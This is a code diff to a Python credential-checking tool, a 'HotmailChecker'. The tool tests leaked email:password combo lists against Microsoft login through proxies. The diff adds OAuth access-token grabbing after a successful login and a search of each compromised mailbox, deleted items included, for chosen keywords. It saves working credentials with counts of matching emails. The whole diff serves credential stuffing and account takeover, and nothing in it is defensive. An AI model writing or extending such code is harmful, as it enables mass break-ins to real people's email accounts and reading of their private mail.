@@ -9,6 +9,7 @@ import os
 import re
 import sys
 import time
+import uuid
 import asyncio
 import sqlite3
 import logging
@@ -238,6 +239,7 @@ class HotmailChecker:
             "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
             "Accept-Language": "en-US,en;q=0.9",
         })
+        self.access_token = None
 
     def _get_sft(self):
         url = (
@@ -271,11 +273,100 @@ class HotmailChecker:
                 time.sleep(0.3)
         return None, None
 
+    def _grab_token(self):
+        """Try several scopes to obtain a usable access token after login."""
+        scopes = [
+            "service::outlook.office.com::MBI_SSL",
+            "service::user.auth.xboxlive.com::MBI_SSL",
+            "https://outlook.office.com/.default",
+        ]
+        for scope in scopes:
+            try:
+                url = (
+                    "https://login.live.com/oauth20_authorize.srf"
+                    f"?client_id=00000000402B5328&response_type=token"
+                    f"&scope={scope}"
+                    "&redirect_uri=https://login.live.com/oauth20_desktop.srf&prompt=none"
+                )
+                r = self.session.get(url, timeout=10, allow_redirects=True)
+                if "access_token" in r.url:
+                    frag = parse_qs(urlparse(r.url).fragment)
+                    tok = frag.get("access_token", [None])[0]
+                    if tok:
+                        self.access_token = tok
+                        return tok
+            except Exception:
+                continue
+        return None
+
+    def search_inbox(self):
+        """
+        Search inbox for each keyword.
+        Returns: (dict keyword->count, total_count)
+        """
+        found = {}
+        total = 0
+        if not self.access_token:
+            self._grab_token()
+        if not self.access_token:
+            return found, 0
+
+        headers = {
+            "Authorization": f"Bearer {self.access_token}",
+            "Content-Type": "application/json",
+            "User-Agent": "Outlook-Android/2.0",
+            "Accept": "application/json",
+        }
+        url = "https://outlook.live.com/search/api/v2/query"
+        for kw in self.keywords[:25]:
+            try:
+                payload = {
+                    "Cvid": str(uuid.uuid4()),
+                    "Scenario": {"Name": "owa.react"},
+                    "TimeZone": "UTC",
+                    "TextDecorations": "Off",
+                    "EntityRequests": [{
+                        "EntityType": "Conversation",
+                        "ContentSources": ["Exchange"],
+                        "Filter": {
+                            "Or": [
+                                {"Term": {"DistinguishedFolderName": "msgfolderroot"}},
+                                {"Term": {"DistinguishedFolderName": "DeletedItems"}},
+                            ]
+                        },
+                        "From": 0,
+                        "Query": {"QueryString": kw},
+                        "Size": 25,
+                        "EnableTopResults": True,
+                        "TopResultsCount": 3,
+                    }],
+                }
+                r = self.session.post(url, json=payload, headers=headers, timeout=12)
+                if r.status_code != 200:
+                    continue
+                data = r.json()
+                cnt = 0
+                for es in data.get("EntitySets") or []:
+                    for rs in es.get("ResultSets") or []:
+                        if "Total" in rs:
+                            cnt = int(rs["Total"] or 0)
+                        elif "ResultCount" in rs:
+                            cnt = int(rs["ResultCount"] or 0)
+                        elif "Results" in rs:
+                            cnt = len(rs["Results"] or [])
+                if cnt > 0:
+                    found[kw] = cnt
+                    total += cnt
+            except Exception:
+                continue
+        return found, total
+
     def login(self) -> dict:
-        result = {"status": "error", "country": None, "keywords": []}
+        result = {"status": "error", "country": None, "keywords": {}, "inbox_total": 0}
         try:
             url_post, sft = self._get_sft()
             if not url_post or not sft:
+                result["status"] = "error"
                 return result
             data = {
                 "login": self.email,
@@ -293,6 +384,8 @@ class HotmailChecker:
 
             if "#" in final and "access_token" in final:
                 result["status"] = "valid"
+                frag = parse_qs(urlparse(final).fragment)
+                self.access_token = frag.get("access_token", [None])[0]
             elif "cancel?mkt=" in r.text or "consent" in text:
                 result["status"] = "valid"
             elif "your account or password is incorrect" in text or "doesn't exist" in text:
@@ -310,7 +403,12 @@ class HotmailChecker:
                         "&redirect_uri=https://login.live.com/oauth20_desktop.srf&prompt=none"
                     )
                     r2 = self.session.get(auth, timeout=10, allow_redirects=True)
-                    result["status"] = "valid" if "access_token" in r2.url else "invalid"
+                    if "access_token" in r2.url:
+                        result["status"] = "valid"
+                        frag = parse_qs(urlparse(r2.url).fragment)
+                        self.access_token = frag.get("access_token", [None])[0]
+                    else:
+                        result["status"] = "invalid"
                 except Exception:
                     result["status"] = "error"
 
@@ -318,6 +416,10 @@ class HotmailChecker:
                 m = re.search(r'"Country":"([A-Z]{2})"', r.text)
                 if m:
                     result["country"] = m.group(1)
+                # real inbox keyword scan
+                kw_map, total = self.search_inbox()
+                result["keywords"] = kw_map
+                result["inbox_total"] = total
         except Exception:
             result["status"] = "error"
         return result
@@ -359,9 +461,18 @@ def run_job(uid: int, combos: List[str], proxies: List[str], threads: int, keywo
             stats["checked"] += 1
             if st == "valid":
                 stats["valid"] += 1
-                kws = ",".join(res.get("keywords") or [])
-                stats["hits"].append(f"{email}:{password}")
-                save_hit(uid, email, password, "valid", res.get("country"), kws)
+                kw_map = res.get("keywords") or {}
+                total = res.get("inbox_total") or 0
+                if isinstance(kw_map, dict) and kw_map:
+                    parts = [f"{k}:{v}" for k, v in kw_map.items()]
+                    kw_str = ", ".join(parts)
+                    line_out = f"{email}:{password} | {total} Email Found | [{kw_str}]"
+                    stats["hits"].append(line_out)
+                    save_hit(uid, email, password, "valid", res.get("country"), kw_str)
+                else:
+                    line_out = f"{email}:{password} | VALID"
+                    stats["hits"].append(line_out)
+                    save_hit(uid, email, password, "valid", res.get("country"), "")
             elif st == "2fa":
                 stats["2fa"] += 1
                 save_hit(uid, email, password, "2fa")
